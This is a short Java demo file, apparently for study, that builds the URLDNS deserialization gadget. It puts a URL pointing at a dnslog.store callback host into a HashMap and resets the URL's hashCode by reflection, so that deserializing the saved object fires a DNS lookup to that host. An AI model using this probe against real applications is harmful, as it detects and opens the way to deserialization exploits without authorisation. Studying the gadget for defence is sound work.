package com.demo2;

import java.lang.reflect.Field;
import java.net.*;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void serialize(Object obj,String file) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
        oos.writeObject(obj);
    }

    public static Object deserialize(String file) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
        Object obj = ois.readObject();
        return obj;
    }


    public static void main(String[] args) throws Exception{


        String file = "demo2.ser";


        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL url = new URL( null,"http://test1.dd9cf16a.dnslog.store",handler);
        hashMap.put(url, 0);
        Field f = java.net.URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);

        serialize(hashMap,file);

        deserialize(file);

    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}